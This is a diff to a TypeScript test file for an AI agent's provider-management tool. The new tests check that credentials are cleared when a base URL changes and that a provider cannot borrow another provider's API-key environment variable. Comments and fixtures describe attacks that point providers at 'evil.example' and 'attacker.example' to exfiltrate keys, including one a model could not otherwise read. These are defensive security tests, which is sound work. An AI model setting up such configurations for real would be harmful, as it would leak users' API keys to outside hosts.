@@ -409,6 +409,24 @@ describe('provider_manage', () => {
         providers: { 'test-provider': { type: 'openai', apiKey: 'sk-real-key', baseUrl: 'https://api.openai.com' } },
       });
 
+    // The shape the product ACTUALLY stores. `fallback-provider-key-store.ts`
+    // writes `apiKeys[]` and deletes the scalar, and `resolveActiveKey` prefers
+    // the array — so a fixture seeded with only `apiKey`, as this block's
+    // `withKey()` does, exercises a field no real config carries. The guard
+    // passed against it while the live key survived every redirect.
+    const withStoredKeys = () =>
+      makeOpts({
+        providers: {
+          'test-provider': {
+            type: 'openai',
+            baseUrl: 'https://api.openai.com',
+            activeKey: 'default',
+            apiKeys: [{ label: 'default', apiKey: 'sk-real-key' }],
+            envVars: ['TEST_PROVIDER_API_KEY'],
+          },
+        },
+      });
+
     it('clears the stored API key when the base URL changes', async () => {
       const opts = withKey();
       const tool = getTool(createFallbackManageTools(opts), PROVIDER_MANAGE_TOOL_NAME);
@@ -418,10 +436,66 @@ describe('provider_manage', () => {
         baseUrl: 'https://evil.example/v1',
       });
       expect(result.status).toBe('ok');
-      expect(result.message).toContain('API key cleared');
+      expect(result.message).toContain('cleared apiKey');
       const cfg = opts.getConfig() as unknown as { providers: Record<string, { apiKey?: string; baseUrl?: string }> };
       expect(cfg.providers['test-provider']?.apiKey).toBeUndefined();
       expect(cfg.providers['test-provider']?.baseUrl).toBe('https://evil.example/v1');
+    });
+
+    it('clears every credential selector, not just the legacy scalar', async () => {
+      // Attacker goal: repoint the endpoint and keep the machine's real key, so
+      // the next request — or the boot-time /v1/models probe — delivers it.
+      const opts = withStoredKeys();
+      const tool = getTool(createFallbackManageTools(opts), PROVIDER_MANAGE_TOOL_NAME);
+      const result = await run(tool, {
+        action: 'configure',
+        provider: 'test-provider',
+        baseUrl: 'https://evil.example/v1',
+      });
+      expect(result.status).toBe('ok');
+      const entry = (opts.getConfig() as unknown as {
+        providers: Record<string, Record<string, unknown>>;
+      }).providers['test-provider']!;
+      expect(entry.apiKeys).toBeUndefined();
+      expect(entry.activeKey).toBeUndefined();
+      expect(entry.envVars).toBeUndefined();
+      expect(result.message).toContain('cleared');
+    });
+
+    it('refuses to read an environment variable that keys another provider', async () => {
+      // Attacker goal: exfiltrate a secret the model cannot otherwise read, by
+      // standing up a provider that points at an attacker host and sources its
+      // key from someone else's environment variable.
+      const opts = makeOpts({
+        providers: {
+          openai: { type: 'openai', envVars: ['OPENAI_API_KEY'] },
+        },
+      });
+      const tool = getTool(createFallbackManageTools(opts), PROVIDER_MANAGE_TOOL_NAME);
+      const result = await run(tool, {
+        action: 'add',
+        provider: 'exfil',
+        type: 'openai-compatible',
+        baseUrl: 'https://attacker.example/v1',
+        envVars: ['OPENAI_API_KEY'],
+      });
+      expect(result.status).toBe('error');
+      expect(result.message).toContain('already supplies the key for provider "openai"');
+      const cfg = opts.getConfig() as unknown as { providers: Record<string, unknown> };
+      expect(cfg.providers.exfil).toBeUndefined();
+    });
+
+    it('still lets a provider declare its own environment variable', async () => {
+      const opts = makeOpts({ providers: { openai: { type: 'openai', envVars: ['OPENAI_API_KEY'] } } });
+      const tool = getTool(createFallbackManageTools(opts), PROVIDER_MANAGE_TOOL_NAME);
+      const result = await run(tool, {
+        action: 'add',
+        provider: 'local-llm',
+        type: 'openai-compatible',
+        baseUrl: 'http://127.0.0.1:11434/v1',
+        envVars: ['LOCAL_LLM_API_KEY'],
+      });
+      expect(result.status).toBe('ok');
     });
 
     it('keeps a key supplied in the same call as the base URL change', async () => {
